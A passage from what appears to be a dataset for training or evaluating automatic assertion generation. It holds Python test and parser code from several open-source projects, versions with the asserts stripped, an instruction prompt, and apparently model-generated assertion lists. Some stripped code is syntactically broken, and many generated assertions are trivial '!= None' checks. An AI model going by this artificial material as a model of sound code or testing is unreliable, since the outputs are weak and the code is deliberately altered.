52                    # The LG TV doesn't (at least at this patch level) report
53                    # its media state via CURRENT_MEDIA_STATE. Therefore ""ok""
54                    # is the best we can say.
55                    state=""ok"",
56                ),
57            ],
58        ),
59    )
60
61    """"""
62    """"""
63",3518,"[[18, 'hass', '!=', None, 'hass object must be initialized'],
[20, 'accessories', '!=', None, 'accessories must be initialized after reading from file'],
[20, 'accessories', '>=', 1, 'there should be at least one accessory in the list']]"
aldebaran/qibuild,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2012-2021 SoftBank Robotics. All rights reserved.
# Use of this source code is governed by a BSD-style license (see the COPYING file).
"""""" QiBuild """"""
from __future__ import absolute_import
from __future__ import unicode_literals
from __future__ import print_function

import os
import pytest

import qidoc.doxygen
import qidoc.builder
from qidoc.test.conftest import find_link


def test_read_doxyfile(tmpdir):
    """""" Test Read DoxyFile """"""
    doxyfile = tmpdir.join(""Doxyfile"")
    doxyfile.write(
        r""""""
INPUT  =      foo \
  include/foo.h
# This is a comment
SPAM=eggs
PREDEFINED = ""FOO=1""
PREDEFINED += ""BAR=0""
"""""")
    parsed = qidoc.doxygen.read_doxyfile(doxyfile.strpath)
    assert parsed[""INPUT""] == ""foo   include/foo.h""
    assert parsed[""SPAM""] == ""eggs""
    assert parsed[""PREDEFINED""] == '""FOO=1"" ""BAR=0""'


def test_bad_doxyfile(tmpdir):
    """""" Test Bad DoxyFile """"""
    doxyfile = tmpdir.join(""Doxyfile"")
    doxyfile.write(""""""""\nFOO = 1\nBAR += 2\n"""""")
    with pytest.raises(Exception) as e:
        qidoc.doxygen.read_doxyfile(doxyfile.strpath)
    assert ""does not match"" in str(e.value)


def test_appending_values(tmpdir):
    """""" Test Appending Values """"""
    doxyfile = tmpdir.join(""Doxyfile"")
    contents = """"""PREDEFINED = ""FOO=1""\nPREDEFINED += ""BAR=0""\n""""""
    doxyfile.write(contents)
    parsed = qidoc.doxygen.read_doxyfile(doxyfile.strpath)
    assert parsed[""PREDEFINED""] == '""FOO=1"" ""BAR=0""'
    generated = tmpdir.join(""generated"")
    qidoc.doxygen.write_doxyfile(parsed, generated.strpath)
    assert generated.read() == """"""PREDEFINED = ""FOO=1"" ""BAR=0""\n""""""


def test_forced_settings(doc_worktree):
    """""" Test Forced Settings """"""
    foo_dox = doc_worktree.create_doxygen_project(""foo"")
    foo_dox.configure()
    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
    assert conf[""OUTPUT_DIRECTORY""] == foo_dox.build_dir
    assert conf[""GENERATE_LATEX""] == ""NO""
    assert conf[""GENERATE_XML""] == ""YES""
    assert conf[""PROJECT_NAME""] == ""foo""


def test_rewrite_relative_paths(doc_worktree):
    """""" Test Rewrite Relative Path """"""
    foo_dox = doc_worktree.create_doxygen_project(""foo"")
    conf = dict()
    conf[""INPUT""] = ""src/ include/foo""
    conf[""EXAMPLE_PATH""] = ""example""
    qidoc.doxygen.write_doxyfile(conf, foo_dox.in_doxyfile)
    foo_dox.configure()
    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
    assert conf[""EXAMPLE_PATH""] == os.path.join(foo_dox.path, ""example"")
    assert conf[""INPUT""] == ""%s %s"" % (
        os.path.join(foo_dox.path, ""src/""),
        os.path.join(foo_dox.path, ""include/foo"")
    )


def test_with_version(doc_worktree):
    """""" Test With Version """"""
    foo_dox = doc_worktree.create_doxygen_project(""foo"")
    foo_dox.configure(version=""1.2.3"")
    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
    assert conf[""PROJECT_NUMBER""] == ""1.2.3""


def test_ovewrite_name(doc_worktree):
    """""" Test Overwrite Name """"""
    foo_dox = doc_worktree.create_doxygen_project(""foo"")
    conf = dict()
    conf[""PROJECT_NAME""] = ""foo_overwrite""
    qidoc.doxygen.write_doxyfile(conf, foo_dox.in_doxyfile)
    foo_dox.configure()
    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
    assert conf[""PROJECT_NAME""] == ""foo_overwrite""


def test_depends_on_doxygen(doc_worktree, tmpdir):
    """""" Test Depends On DoxyGen """"""
    _libworld_proj = doc_worktree.add_test_project(""libworld"")
    libhello_proj = doc_worktree.add_test_project(""libhello"")
    doc_builder = qidoc.builder.DocBuilder(doc_worktree, ""libhello"")
    doc_builder.configure()
    doc_builder.build()
    hello_index = libhello_proj.index_html
    link = find_link(hello_index, ""world()"")
    assert os.path.exists(link)
    doc_builder.install(tmpdir.strpath)
    link = find_link(tmpdir.join(""index.html"").strpath, ""world()"")
    assert not os.path.isabs(link)
    assert tmpdir.join(link).check(file=True)


def test_build(doc_worktree):
    """""" Test Build """"""
    doc_worktree.add_test_project(""libqi"")
    qi_dox = doc_worktree.get_doc_project(""qi-api"", raises=True)
    qi_dox.configure()
    qi_dox.build()
    assert os.path.exists(qi_dox.index_html)
","
1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3# Copyright (c) 2012-2021 SoftBank Robotics. All rights reserved.
4# Use of this source code is governed by a BSD-style license (see the COPYING file).
5"""""" QiBuild """"""
6from __future__ import absolute_import
7from __future__ import unicode_literals
8from __future__ import print_function
9
10import os
11import pytest
12
13import qidoc.doxygen
14import qidoc.builder
15from qidoc.test.conftest import find_link
16
17
18def test_read_doxyfile(tmpdir):
19    """""" Test Read DoxyFile """"""
20    doxyfile = tmpdir.join(""Doxyfile"")
21    doxyfile.write(
22        r""""""
23INPUT  =      foo \
24  include/foo.h
25# This is a comment
26SPAM=eggs
27PREDEFINED = ""FOO=1""
28PREDEFINED += ""BAR=0""
29"""""")
30    parsed = qidoc.doxygen.read_doxyfile(doxyfile.strpath)
31
32
33def test_bad_doxyfile(tmpdir):
34    """""" Test Bad DoxyFile """"""
35    doxyfile = tmpdir.join(""Doxyfile"")
36    doxyfile.write(""""""""\nFOO = 1\nBAR += 2\n"""""")
37    with pytest.raises(Exception) as e:
38        qidoc.doxygen.read_doxyfile(doxyfile.strpath)
39
40
41def test_appending_values(tmpdir):
42    """""" Test Appending Values """"""
43    doxyfile = tmpdir.join(""Doxyfile"")
44    contents = """"""PREDEFINED = ""FOO=1""\nPREDEFINED += ""BAR=0""\n""""""
45    doxyfile.write(contents)
46    parsed = qidoc.doxygen.read_doxyfile(doxyfile.strpath)
47    generated = tmpdir.join(""generated"")
48    qidoc.doxygen.write_doxyfile(parsed, generated.strpath)
49
50
51def test_forced_settings(doc_worktree):
52    """""" Test Forced Settings """"""
53    foo_dox = doc_worktree.create_doxygen_project(""foo"")
54    foo_dox.configure()
55    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
56
57
58def test_rewrite_relative_paths(doc_worktree):
59    """""" Test Rewrite Relative Path """"""
60    foo_dox = doc_worktree.create_doxygen_project(""foo"")
61    conf = dict()
62    conf[""INPUT""] = ""src/ include/foo""
63    conf[""EXAMPLE_PATH""] = ""example""
64    qidoc.doxygen.write_doxyfile(conf, foo_dox.in_doxyfile)
65    foo_dox.configure()
66    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
67        os.path.join(foo_dox.path, ""src/""),
68        os.path.join(foo_dox.path, ""include/foo"")
69    )
70
71
72def test_with_version(doc_worktree):
73    """""" Test With Version """"""
74    foo_dox = doc_worktree.create_doxygen_project(""foo"")
75    foo_dox.configure(version=""1.2.3"")
76    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
77
78
79def test_ovewrite_name(doc_worktree):
80    """""" Test Overwrite Name """"""
81    foo_dox = doc_worktree.create_doxygen_project(""foo"")
82    conf = dict()
83    conf[""PROJECT_NAME""] = ""foo_overwrite""
84    qidoc.doxygen.write_doxyfile(conf, foo_dox.in_doxyfile)
85    foo_dox.configure()
86    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
87
88
89def test_depends_on_doxygen(doc_worktree, tmpdir):
90    """""" Test Depends On DoxyGen """"""
91    _libworld_proj = doc_worktree.add_test_project(""libworld"")
92    libhello_proj = doc_worktree.add_test_project(""libhello"")
93    doc_builder = qidoc.builder.DocBuilder(doc_worktree, ""libhello"")
94    doc_builder.configure()
95    doc_builder.build()
96    hello_index = libhello_proj.index_html
97    link = find_link(hello_index, ""world()"")
98    doc_builder.install(tmpdir.strpath)
99    link = find_link(tmpdir.join(""index.html"").strpath, ""world()"")
100
101
102def test_build(doc_worktree):
103    """""" Test Build """"""
104    doc_worktree.add_test_project(""libqi"")
105    qi_dox = doc_worktree.get_doc_project(""qi-api"", raises=True)
106    qi_dox.configure()
107    qi_dox.build()
108","[['parsed[""INPUT""]', '==', '""foo include/foo.h""'], ['parsed[""SPAM""]', '==', '""eggs""'], ['parsed[""PREDEFINED""]', '==', '\'""FOO=1"" ""BAR=0""\''], ['parsed[""PREDEFINED""]', '==', '\'""FOO=1"" ""BAR=0""\''], ['generated.read()', '==', '""""""PREDEFINED = ""FOO=1"" ""BAR=0""\\n""""""'], ['conf[""OUTPUT_DIRECTORY""]', '==', 'foo_dox.build_dir'], ['conf[""GENERATE_LATEX""]', '==', '""NO""'], ['conf[""GENERATE_XML""]', '==', '""YES""'], ['conf[""PROJECT_NAME""]', '==', '""foo""'], ['conf[""EXAMPLE_PATH""]', '==', 'os.path.join(foo_dox.path'], ['conf[""INPUT""]', '==', '""%s %s"" % ('], ['conf[""PROJECT_NUMBER""]', '==', '""1.2.3""'], ['conf[""PROJECT_NAME""]', '==', '""foo_overwrite""'], ['os.path.exists(link)', '==', 'True'], ['os.path.isabs(link)', '==', 'False'], ['tmpdir.join(link).check(file=True)', '==', 'True'], ['os.path.exists(qi_dox.index_html)', '==', 'True']]",18,17,0.9444444444444444,0.0040360873694207,"['tmpdir', 'doxyfile', 'INPUT', 'PREDEFINED', 'parsed', 'doxyfile.write(""""""""\\nFOO', 'contents', 'generated', 'assert generated.read() == """"""PREDEFINED', 'doc_worktree', 'foo_dox', 'conf', 'conf[""INPUT""]', 'conf[""EXAMPLE_PATH""]', 'conf[""PROJECT_NAME""]', '_libworld_proj', 'libhello_proj', 'doc_builder', 'hello_index', 'link', 'qi_dox']",21,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['tmpdir', 'doxyfile', 'INPUT', 'PREDEFINED', 'parsed', 'doxyfile.write(""""""""\\nFOO', 'contents', 'generated', 'assert generated.read() == """"""PREDEFINED', 'doc_worktree', 'foo_dox', 'conf', 'conf[""INPUT""]', 'conf[""EXAMPLE_PATH""]', 'conf[""PROJECT_NAME""]', '_libworld_proj', 'libhello_proj', 'doc_builder', 'hello_index', 'link', 'qi_dox']
*Code:

1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3# Copyright (c) 2012-2021 SoftBank Robotics. All rights reserved.
4# Use of this source code is governed by a BSD-style license (see the COPYING file).
5"""""" QiBuild """"""
6from __future__ import absolute_import
7from __future__ import unicode_literals
8from __future__ import print_function
9
10import os
11import pytest
12
13import qidoc.doxygen
14import qidoc.builder
15from qidoc.test.conftest import find_link
16
17
18def test_read_doxyfile(tmpdir):
19    """""" Test Read DoxyFile """"""
20    doxyfile = tmpdir.join(""Doxyfile"")
21    doxyfile.write(
22        r""""""
23INPUT  =      foo \
24  include/foo.h
25# This is a comment
26SPAM=eggs
27PREDEFINED = ""FOO=1""
28PREDEFINED += ""BAR=0""
29"""""")
30    parsed = qidoc.doxygen.read_doxyfile(doxyfile.strpath)
31
32
33def test_bad_doxyfile(tmpdir):
34    """""" Test Bad DoxyFile """"""
35    doxyfile = tmpdir.join(""Doxyfile"")
36    doxyfile.write(""""""""\nFOO = 1\nBAR += 2\n"""""")
37    with pytest.raises(Exception) as e:
38        qidoc.doxygen.read_doxyfile(doxyfile.strpath)
39
40
41def test_appending_values(tmpdir):
42    """""" Test Appending Values """"""
43    doxyfile = tmpdir.join(""Doxyfile"")
44    contents = """"""PREDEFINED = ""FOO=1""\nPREDEFINED += ""BAR=0""\n""""""
45    doxyfile.write(contents)
46    parsed = qidoc.doxygen.read_doxyfile(doxyfile.strpath)
47    generated = tmpdir.join(""generated"")
48    qidoc.doxygen.write_doxyfile(parsed, generated.strpath)
49
50
51def test_forced_settings(doc_worktree):
52    """""" Test Forced Settings """"""
53    foo_dox = doc_worktree.create_doxygen_project(""foo"")
54    foo_dox.configure()
55    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
56
57
58def test_rewrite_relative_paths(doc_worktree):
59    """""" Test Rewrite Relative Path """"""
60    foo_dox = doc_worktree.create_doxygen_project(""foo"")
61    conf = dict()
62    conf[""INPUT""] = ""src/ include/foo""
63    conf[""EXAMPLE_PATH""] = ""example""
64    qidoc.doxygen.write_doxyfile(conf, foo_dox.in_doxyfile)
65    foo_dox.configure()
66    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
67        os.path.join(foo_dox.path, ""src/""),
68        os.path.join(foo_dox.path, ""include/foo"")
69    )
70
71
72def test_with_version(doc_worktree):
73    """""" Test With Version """"""
74    foo_dox = doc_worktree.create_doxygen_project(""foo"")
75    foo_dox.configure(version=""1.2.3"")
76    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
77
78
79def test_ovewrite_name(doc_worktree):
80    """""" Test Overwrite Name """"""
81    foo_dox = doc_worktree.create_doxygen_project(""foo"")
82    conf = dict()
83    conf[""PROJECT_NAME""] = ""foo_overwrite""
84    qidoc.doxygen.write_doxyfile(conf, foo_dox.in_doxyfile)
85    foo_dox.configure()
86    conf = qidoc.doxygen.read_doxyfile(foo_dox.out_doxyfile)
87
88
89def test_depends_on_doxygen(doc_worktree, tmpdir):
90    """""" Test Depends On DoxyGen """"""
91    _libworld_proj = doc_worktree.add_test_project(""libworld"")
92    libhello_proj = doc_worktree.add_test_project(""libhello"")
93    doc_builder = qidoc.builder.DocBuilder(doc_worktree, ""libhello"")
94    doc_builder.configure()
95    doc_builder.build()
96    hello_index = libhello_proj.index_html
97    link = find_link(hello_index, ""world()"")
98    doc_builder.install(tmpdir.strpath)
99    link = find_link(tmpdir.join(""index.html"").strpath, ""world()"")
100
101
102def test_build(doc_worktree):
103    """""" Test Build """"""
104    doc_worktree.add_test_project(""libqi"")
105    qi_dox = doc_worktree.get_doc_project(""qi-api"", raises=True)
106    qi_dox.configure()
107    qi_dox.build()
108",5291,"[[18, 'tmpdir', '!=', None, 'tmpdir variable should not be None'],
 [30, 'parsed', '!=', None, 'parsed variable should not be None'],
 [33, 'tmpdir', '!=', None, 'tmpdir variable should not be None'],
 [38, 'e', '!=', None, 'Error variable should not be None'],
 [41, 'tmpdir', '!=', None, 'tmpdir variable should not be None'],
 [46, 'parsed', '!=', None, 'parsed variable should not be None'],
 [47, 'generated', '!=', None, 'generated variable should not be None'],
 [51, 'doc_worktree', '!=', None, 'doc_worktree variable should not be None'],
 [53, 'foo_dox', '!=', None, 'foo_dox variable should not be None'],
 [55, 'conf', '!=', None, 'conf variable should not be None'],
 [58, 'doc_worktree', '!=', None, 'doc_worktree variable should not be None'],
 [60, 'foo_dox', '!=', None, 'foo_dox variable should not be None'],
 [62, 'conf[""INPUT""]', '!=', None, 'conf[""INPUT""] variable should not be None'],
 [63, 'conf[""EXAMPLE_PATH""]', '!=', None, 'conf[""EXAMPLE_PATH""] variable should not be None'],
 [66, 'conf', '!=', None, 'conf variable should not be None'],
 [72, 'doc_worktree', '!=', None, 'doc_worktree variable should not be None'],
 [74, 'foo_dox', '!=', None, 'foo_dox variable should not be None'],
 [76, 'conf', '!=', None, 'conf variable should not be None'],
 [79, 'doc_worktree', '!=', None, 'doc_worktree variable should not be None'],
 [81, 'foo_dox', '!=', None, 'foo_dox variable should not be None'],
 [83, 'conf[""PROJECT_NAME""]', '!=', None, 'conf[""PROJECT_NAME""] variable should not be None'],
 [86, 'conf', '!=', None, 'conf variable should not be None'],
 [89, 'doc_worktree', '!=', None, 'doc_worktree variable should not be None'],
 [89, 'tmpdir', '!=', None, 'tmpdir variable should not be None'],
 [91, '_libworld_proj', '!=', None, '_libworld_proj variable should not be None'],
 [92, 'libhello_proj', '!=', None, 'libhello_proj variable should not be None'],
 [93, 'doc_builder', '!=', None, 'doc_builder variable should not be None'],
 [96, 'hello_index', '!=', None, 'hello_index variable should not be None'],
 [97, 'link', '!=', None, 'link variable should not be None'],
 [99, 'link', '!=', None, 'link variable should not be None'],
 [102, 'doc_worktree', '!=', None, 'doc_worktree variable should not be None'],
 [105, 'qi_dox', '!=', None, 'qi_dox variable should not be None']]"
larsbergstrom/servo,"import pytest

from webdriver import StaleElementReferenceException

from tests.support.asserts import assert_error, assert_success
from tests.support.inline import inline, iframe


def switch_to_parent_frame(session):
    return session.transport.send(
        ""POST"", ""session/{session_id}/frame/parent"".format(**vars(session)))


def test_null_response_value(session):
    session.url = inline(iframe(""<p>foo""))
    frame_element = session.find.css(""iframe"", all=False)
    session.switch_frame(frame_element)

    response = switch_to_parent_frame(session)
    value = assert_success(response)
    assert value is None


def test_no_browsing_context(session, closed_window):
    response = switch_to_parent_frame(session)
    assert_error(response, ""no such window"")


def test_stale_element_from_iframe(session):
    session.url = inline(iframe(""<p>foo""))
    frame_element = session.find.css(""iframe"", all=False)
    session.switch_frame(frame_element)
    stale_element = session.find.css(""p"", all=False)

    result = switch_to_parent_frame(session)
    assert_success(result)

    with pytest.raises(StaleElementReferenceException):
        stale_element.text
","
1import pytest
2
3from webdriver import StaleElementReferenceException
4
5from tests.support.inline import inline, iframe
6
7
8def switch_to_parent_frame(session):
9    return session.transport.send(
10        ""POST"", ""session/{session_id}/frame/parent"".format(**vars(session)))
11
12
13def test_null_response_value(session):
14    session.url = inline(iframe(""<p>foo""))
15    frame_element = session.find.css(""iframe"", all=False)
16    session.switch_frame(frame_element)
17
18    response = switch_to_parent_frame(session)
19
20
21def test_no_browsing_context(session, closed_window):
22    response = switch_to_parent_frame(session)
23
24
25def test_stale_element_from_iframe(session):
26    session.url = inline(iframe(""<p>foo""))
27    frame_element = session.find.css(""iframe"", all=False)
28    session.switch_frame(frame_element)
29    stale_element = session.find.css(""p"", all=False)
30
31    result = switch_to_parent_frame(session)
32
33    with pytest.raises(StaleElementReferenceException):
34        stale_element.text
35","[['value', '==', 'None']]",5,1,0.2,0.0008554319931565,"['session', 'session.url', 'frame_element', 'response', 'value', 'closed_window', 'stale_element', 'result']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['session', 'session.url', 'frame_element', 'response', 'value', 'closed_window', 'stale_element', 'result']
*Code:

1import pytest
2
3from webdriver import StaleElementReferenceException
4
5from tests.support.inline import inline, iframe
6
7
8def switch_to_parent_frame(session):
9    return session.transport.send(
10        ""POST"", ""session/{session_id}/frame/parent"".format(**vars(session)))
11
12
13def test_null_response_value(session):
14    session.url = inline(iframe(""<p>foo""))
15    frame_element = session.find.css(""iframe"", all=False)
16    session.switch_frame(frame_element)
17
18    response = switch_to_parent_frame(session)
19
20
21def test_no_browsing_context(session, closed_window):
22    response = switch_to_parent_frame(session)
23
24
25def test_stale_element_from_iframe(session):
26    session.url = inline(iframe(""<p>foo""))
27    frame_element = session.find.css(""iframe"", all=False)
28    session.switch_frame(frame_element)
29    stale_element = session.find.css(""p"", all=False)
30
31    result = switch_to_parent_frame(session)
32
33    with pytest.raises(StaleElementReferenceException):
34        stale_element.text
35",2522,"[[9, 'session', '!=', None, ""ensure the session exists before using its transport.send method""],
 [14, 'session.url', '!=', None, ""ensure the URL is set before searching elements in it""],
 [15, 'frame_element', '!=', None, ""Ensure an iframe exists before switching frames""],
 [22, 'session', '!=', None, ""Ensure the session exists before switching to parent frame""],
 [26, 'session.url', '!=', None, ""Ensure URL is set before searching iframe""],
 [27, 'frame_element', '!=', None, ""Ensure iframe exists before switching frames""],
 [29, 'stale_element', '!=', None, ""Ensure the stale element exists before accessing its text property""]]"
dwillmer/blaze,"from __future__ import absolute_import, division, print_function

import ast
from itertools import repeat

from toolz import merge

from . import arithmetic
from . import math
from .expressions import Expr, symbol

__all__ = ['exprify']


def generate_methods(node_names, funcs, builder):
    def wrapped(cls):
        for node_name, func in zip(node_names, funcs):
            setattr(cls, 'visit_%s' % node_name, builder(func))
        return cls
    return wrapped


arithmetic_ops = ['Eq', 'Ne', 'Lt', 'Gt', 'Le', 'Ge', 'BitAnd', 'BitOr',
        'Invert', 'USub', 'Add', 'Mult', 'Div', 'FloorDiv', 'Pow', 'Mod',
        'Sub']


@generate_methods(arithmetic_ops, arithmetic_ops,
                  builder=lambda func: lambda self, node: getattr(arithmetic, func))
class BlazeParser(ast.NodeVisitor):
    def __init__(self, dtypes, scope):
        self.dtypes = dtypes
        self.scope = scope

    def visit_Compare(self, node):
        assert len(node.ops) == 1, 'chained comparisons not supported'
        assert len(node.comparators) == 1, 'chained comparisons not supported'
        return self.visit(node.ops[0])(self.visit(node.left),
                                       self.visit(node.comparators[0]))

    def visit_Num(self, node):
        return node.n

    def visit_Str(self, node):
        return node.s

    def visit_Name(self, node):
        name = node.id
        if name.startswith('__'):
            raise ValueError(""invalid name %r"" % name)
        try:
            return self.scope[name]
        except KeyError:
            return symbol(name, self.dtypes[name])

    def visit_BinOp(self, node):
        return self.visit(node.op)(self.visit(node.left),
                                   self.visit(node.right))

    def visit_UnaryOp(self, node):
        op = node.op
        operand = node.operand
        if isinstance(operand, ast.Num):
            return -1 * isinstance(op, ast.USub) * operand.n
        return self.visit(op)(self.visit(operand))

    def visit_Call(self, node):
        assert len(node.args) <= 1, 'only single argument functions allowed'
        assert not node.keywords
        assert node.starargs is None, 'starargs not allowed'
        assert node.kwargs is None, 'kwargs not allowed'
        return self.visit(node.func)(*map(self.visit, node.args))

    def visit(self, node):
        name = node.__class__.__name__
        method = 'visit_' + name
        visitor = getattr(self, method, None)
        if visitor is None:
            raise NotImplementedError('%s nodes are not implemented' % name)
        return visitor(node)


# Operations like sin, cos, exp, isnan, floor, ceil, ...
math_operators = dict((k, v) for k, v in math.__dict__.items()
                if isinstance(v, type) and issubclass(v, Expr))
safe_scope = {'__builtins__': {},  # Python 2
              'builtins': {}}      # Python 3


def exprify(expr, dtypes):
    """""" Transform string into scalar expression

    >>> from blaze.expr import Expr
    >>> expr = exprify('x + y', {'x': 'int64', 'y': 'real'})
    >>> expr
    x + y
    >>> isinstance(expr, Expr)
    True
    >>> expr.lhs.dshape
    dshape(""int64"")
    """"""
    scope = merge(safe_scope, math_operators)

    # use eval mode to raise a SyntaxError if any statements are passed in
    parsed = ast.parse(expr, mode='eval')
    overlapping_names = set(dtypes) & set(scope)
    if overlapping_names:
        raise ValueError('overlapping names %s' % overlapping_names)
    parser = BlazeParser(dtypes, scope)
    return parser.visit(parsed.body)
","
1from __future__ import absolute_import, division, print_function
2
3import ast
4from itertools import repeat
5
6from toolz import merge
7
8from . import arithmetic
9from . import math
10from .expressions import Expr, symbol
11
12__all__ = ['exprify']
13
14
15def generate_methods(node_names, funcs, builder):
16    def wrapped(cls):
17        for node_name, func in zip(node_names, funcs):
18            setattr(cls, 'visit_%s' % node_name, builder(func))
19        return cls
20    return wrapped
21
22
23arithmetic_ops = ['Eq', 'Ne', 'Lt', 'Gt', 'Le', 'Ge', 'BitAnd', 'BitOr',
24        'Invert', 'USub', 'Add', 'Mult', 'Div', 'FloorDiv', 'Pow', 'Mod',
25        'Sub']
26
27
28@generate_methods(arithmetic_ops, arithmetic_ops,
29                  builder=lambda func: lambda self, node: getattr(arithmetic, func))
30class BlazeParser(ast.NodeVisitor):
31    def __init__(self, dtypes, scope):
32        self.dtypes = dtypes
33        self.scope = scope
34
35    def visit_Compare(self, node):
36        return self.visit(node.ops[0])(self.visit(node.left),
37                                       self.visit(node.comparators[0]))
38
39    def visit_Num(self, node):
40        return node.n
41
42    def visit_Str(self, node):
43        return node.s
44
45    def visit_Name(self, node):
46        name = node.id
47        if name.startswith('__'):
48            raise ValueError(""invalid name %r"" % name)
49        try:
50            return self.scope[name]
51        except KeyError:
52            return symbol(name, self.dtypes[name])
53
54    def visit_BinOp(self, node):
55        return self.visit(node.op)(self.visit(node.left),
56                                   self.visit(node.right))
57
58    def visit_UnaryOp(self, node):
59        op = node.op
60        operand = node.operand
61        if isinstance(operand, ast.Num):
62            return -1 * isinstance(op, ast.USub) * operand.n
63        return self.visit(op)(self.visit(operand))
64
65    def visit_Call(self, node):
66        return self.visit(node.func)(*map(self.visit, node.args))
67
68    def visit(self, node):
69        name = node.__class__.__name__
70        method = 'visit_' + name
71        visitor = getattr(self, method, None)
72        if visitor is None:
73            raise NotImplementedError('%s nodes are not implemented' % name)
74        return visitor(node)
75
76
77# Operations like sin, cos, exp, isnan, floor, ceil, ...
78math_operators = dict((k, v) for k, v in math.__dict__.items()
79                if isinstance(v, type) and issubclass(v, Expr))
80safe_scope = {'__builtins__': {},  # Python 2
81              'builtins': {}}      # Python 3
82
83
84def exprify(expr, dtypes):
85    """""" Transform string into scalar expression
86
87    >>> from blaze.expr import Expr
88    >>> expr = exprify('x + y', {'x': 'int64', 'y': 'real'})
89    >>> expr
90    x + y
91    >>> isinstance(expr, Expr)
92    True
93    >>> expr.lhs.dshape
94    dshape(""int64"")
95    """"""
96    scope = merge(safe_scope, math_operators)
97
98    # use eval mode to raise a SyntaxError if any statements are passed in
99    parsed = ast.parse(expr, mode='eval')
100    overlapping_names = set(dtypes) & set(scope)
101    if overlapping_names:
102        raise ValueError('overlapping names %s' % overlapping_names)
103    parser = BlazeParser(dtypes, scope)
104    return parser.visit(parsed.body)
105","[['len(node.ops)', '==', '1'], ['len(node.comparators)', '==', '1'], ['len(node.args)', '<=', '1'], ['node.keywords', '==', 'False'], ['node.starargs', '==', 'None'], ['node.kwargs', '==', 'None']]",6,6,1.0,0.0016901408450704,"['__all__', 'node_names', 'funcs', 'builder', 'cls', 'arithmetic_ops', 'dtypes', 'scope', 'self.dtypes', 'self.scope', 'node', 'name', 'op', 'operand', 'method', 'visitor', 'math_operators', 'safe_scope', 'expr', '>>> expr', 'parsed', 'overlapping_names', 'parser']",23,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__all__', 'node_names', 'funcs', 'builder', 'cls', 'arithmetic_ops', 'dtypes', 'scope', 'self.dtypes', 'self.scope', 'node', 'name', 'op', 'operand', 'method', 'visitor', 'math_operators', 'safe_scope', 'expr', '>>> expr', 'parsed', 'overlapping_names', 'parser']
*Code:

1from __future__ import absolute_import, division, print_function
2
3import ast
4from itertools import repeat
5
6from toolz import merge
7
8from . import arithmetic
9from . import math
10from .expressions import Expr, symbol
11
12__all__ = ['exprify']
13
14
15def generate_methods(node_names, funcs, builder):
16    def wrapped(cls):
17        for node_name, func in zip(node_names, funcs):
18            setattr(cls, 'visit_%s' % node_name, builder(func))
19        return cls
20    return wrapped
21
22
23arithmetic_ops = ['Eq', 'Ne', 'Lt', 'Gt', 'Le', 'Ge', 'BitAnd', 'BitOr',
24        'Invert', 'USub', 'Add', 'Mult', 'Div', 'FloorDiv', 'Pow', 'Mod',
